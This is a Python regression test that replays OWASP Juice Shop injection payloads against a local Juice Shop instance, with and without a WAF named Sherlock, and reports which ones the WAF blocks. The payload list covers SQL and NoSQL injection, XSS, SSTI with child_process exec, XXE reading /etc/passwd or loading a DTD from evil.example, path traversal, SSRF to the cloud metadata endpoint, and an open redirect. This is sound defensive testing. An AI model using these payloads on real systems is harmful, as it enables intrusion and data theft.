#!/usr/bin/env python3
"""Replay Juice Shop's documented injection-challenge payloads through Sherlock.

For every payload it records what the origin does when hit directly (so we know
the endpoint is really reachable and what "success" looks like) and whether
Sherlock stops it (HTTP 403 with an event id). Results are grouped by challenge
category: that is the table in test/nuclei/BASELINE.md.

  python3 test/juice/challenges.py [--json out.json]

Exit status 1 if a payload that is not listed in known-gaps.txt gets through
(a regression). A listed gap that is now blocked is reported so the entry can be
removed.

Expects `make e2e-up` (Sherlock on :18080, Juice Shop direct on :13000).
Payloads come from the Juice Shop challenge catalogue and its public solutions.
"""
import argparse
import http.client
import json
import os
import sys
import urllib.parse

DIRECT = ("127.0.0.1", int(os.environ.get("JUICE_DIRECT_PORT", "13000")))
SHERLOCK = ("127.0.0.1", int(os.environ.get("SHERLOCK_HTTP_PORT", "18080")))
JSON_CT = "application/json"
FORM_CT = "application/x-www-form-urlencoded"
XML_CT = "application/xml"

# (category, name, method, path-with-query, content-type, body)
P = [
    # --- SQL injection
    ("SQL injection", "login bypass (email ' or 1=1--)", "POST", "/rest/user/login", JSON_CT, '{"email":"\' or 1=1--","password":"a"}'),
    ("SQL injection", "login as admin (admin@juice-sh.op'--)", "POST", "/rest/user/login", JSON_CT, '{"email":"admin@juice-sh.op\'--","password":"a"}'),
    ("SQL injection", "UNION SELECT users from search", "GET", "/rest/products/search?q=" + urllib.parse.quote("qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"), None, None),
    ("SQL injection", "'))-- on search (Christmas special)", "GET", "/rest/products/search?q=" + urllib.parse.quote("christmas'))--"), None, None),
    ("SQL injection", "sqlite_master schema dump", "GET", "/rest/products/search?q=" + urllib.parse.quote("x')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"), None, None),
    ("SQL injection", "bare single quote", "GET", "/rest/products/search?q=" + urllib.parse.quote("apple'"), None, None),
    # --- NoSQL injection
    ("NoSQL injection", "review update with $ne operator", "PATCH", "/rest/products/reviews", JSON_CT, '{"id":{"$ne":-1},"message":"NoSQL Injection!"}'),
    ("NoSQL injection", "sleep() in product id (NoSQL DoS)", "GET", "/rest/products/sleep(1000)/reviews", None, None),
    ("NoSQL injection", "$where in review id", "PATCH", "/rest/products/reviews", JSON_CT, '{"id":{"$where":"sleep(100)"},"message":"x"}'),
    # --- Cross-site scripting
    ("XSS", "DOM XSS via search iframe", "GET", "/rest/products/search?q=" + urllib.parse.quote('<iframe src="javascript:alert(`xss`)">'), None, None),
    ("XSS", "<script> in search", "GET", "/rest/products/search?q=" + urllib.parse.quote("<script>alert(1)</script>"), None, None),
    ("XSS", "reflected XSS in order tracking", "GET", "/rest/track-order/" + urllib.parse.quote('<iframe src="javascript:alert(`xss`)">'), None, None),
    ("XSS", "persisted XSS in feedback", "POST", "/api/Feedbacks", JSON_CT, '{"comment":"<iframe src=\\"javascript:alert(`xss`)\\">","rating":1,"captchaId":0,"captcha":"0"}'),
    ("XSS", "img onerror in product review", "PUT", "/rest/products/1/reviews", JSON_CT, '{"message":"<img src=x onerror=alert(1)>","author":"a@b.c"}'),
    ("XSS", "javascript: URL in redirect", "GET", "/redirect?to=" + urllib.parse.quote("javascript:alert(1)"), None, None),
    # --- Code / command injection
    ("Code injection (RCE)", "B2B orderLinesData infinite loop", "POST", "/b2b/v2/orders", JSON_CT, '{"cid":"JS1","orderLinesData":"(function dos() { while(true); })()"}'),
    ("Code injection (RCE)", "B2B orderLinesData ReDoS", "POST", "/b2b/v2/orders", JSON_CT, '{"cid":"JS1","orderLinesData":"/((a+)+)b/.test(\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\')"}'),
    ("Code injection (RCE)", "Node child_process in username (SSTI)", "POST", "/profile", FORM_CT, urllib.parse.urlencode({"username": "#{global.process.mainModule.require('child_process').exec('id')}"})),
    ("Code injection (RCE)", "shell metacharacters", "GET", "/rest/products/search?q=" + urllib.parse.quote("a; cat /etc/passwd"), None, None),
    ("Code injection (RCE)", "$(command substitution)", "GET", "/rest/products/search?q=" + urllib.parse.quote("$(id)"), None, None),
    # --- XML external entity
    ("XXE", "file:///etc/passwd entity upload", "POST", "/file-upload", "multipart/form-data; boundary=XB",
     '--XB\r\nContent-Disposition: form-data; name="file"; filename="x.xml"\r\nContent-Type: application/xml\r\n\r\n'
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>\r\n--XB--\r\n'),
    ("XXE", "XML body with external DTD", "POST", "/file-upload", XML_CT,
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://evil.example/x.dtd">%d;]><r/>'),
    # --- Path traversal / local file inclusion
    ("Path traversal / LFI", "../ via encoded slashes under /ftp", "GET", "/ftp/..%2f..%2f..%2fetc%2fpasswd", None, None),
    ("Path traversal / LFI", "poison null byte on /ftp", "GET", "/ftp/eastere.gg%2500.md", None, None),
    ("Path traversal / LFI", "classic ../../etc/passwd in a parameter", "GET", "/rest/products/search?q=" + urllib.parse.quote("../../../../etc/passwd"), None, None),
    ("Path traversal / LFI", "/proc/self/environ", "GET", "/rest/products/search?q=" + urllib.parse.quote("/proc/self/environ"), None, None),
    # --- Server-side request forgery
    ("SSRF", "cloud metadata URL as profile image", "POST", "/profile/image/url", FORM_CT, urllib.parse.urlencode({"imageUrl": "http://169.254.169.254/latest/meta-data/"})),
    ("SSRF", "localhost admin URL as profile image", "POST", "/profile/image/url", FORM_CT, urllib.parse.urlencode({"imageUrl": "http://127.0.0.1:3000/rest/admin/application-configuration"})),
    # --- Open redirect
    ("Open redirect", "allow-list bypass via query", "GET", "/redirect?to=" + urllib.parse.quote("https://evil.example/?https://github.com/juice-shop/juice-shop"), None, None),
]


def send(addr, method, path, ct, body, host):
    conn = http.client.HTTPConnection(addr[0], addr[1], timeout=15)
    headers = {"Host": host, "Accept": "application/json", "User-Agent": "Mozilla/5.0 (compatible; juice-replay)"}
    data = None
    if body is not None:
        data = body.encode()
        headers["Content-Type"] = ct
    try:
        conn.request(method, path, body=data, headers=headers)
        r = conn.getresponse()
        text = r.read(2048)
        return r.status, r.getheader("X-Sherlock-Event-Id"), text
    except OSError as e:  # connection reset etc.
        return 0, None, str(e).encode()
    finally:
        conn.close()


def known_gaps():
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "known-gaps.txt")
    gaps = {}
    for line in open(path):
        line = line.strip()
        if line and not line.startswith("#"):
            name, _, reason = line.partition(" | ")
            gaps[name] = reason
    return gaps


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--json", help="write results here")
    args = ap.parse_args()

    rows = []
    for cat, name, method, path, ct, body in P:
        d_status, _, _ = send(DIRECT, method, path, ct, body, "juice.localhost")
        s_status, event, _ = send(SHERLOCK, method, path, ct, body, "juice.localhost")
        rows.append({"category": cat, "name": name, "direct_status": d_status, "sherlock_status": s_status,
                     "blocked": s_status == 403 and bool(event), "event_id": event})

    cats = {}
    for r in rows:
        cats.setdefault(r["category"], []).append(r)
    print(f"{'category':26s} {'blocked':>9s}")
    total_b = 0
    for cat, rs in cats.items():
        b = sum(r["blocked"] for r in rs)
        total_b += b
        print(f"{cat:26s} {b:>4d} / {len(rs):<3d}")
        for r in rs:
            mark = "blocked " if r["blocked"] else "PASSED  "
            print(f"    {mark} direct={r['direct_status']:<3d} sherlock={r['sherlock_status']:<3d} {r['name']}")
    print(f"\ntotal blocked: {total_b} / {len(rows)}")
    if args.json:
        json.dump(rows, open(args.json, "w"), indent=2)

    gaps = known_gaps()
    regressions = [r["name"] for r in rows if not r["blocked"] and r["name"] not in gaps]
    closed = [r["name"] for r in rows if r["blocked"] and r["name"] in gaps]
    stale = sorted(set(gaps) - {r["name"] for r in rows})
    for n in closed:
        print(f"NOTICE: known gap is now blocked, remove it from known-gaps.txt: {n}")
    for n in stale:
        print(f"NOTICE: known-gaps.txt lists a payload that no longer exists: {n}")
    for n in regressions:
        print(f"REGRESSION: not blocked and not a known gap: {n}")
    return 1 if regressions else 0


if __name__ == "__main__":
    sys.exit(main())
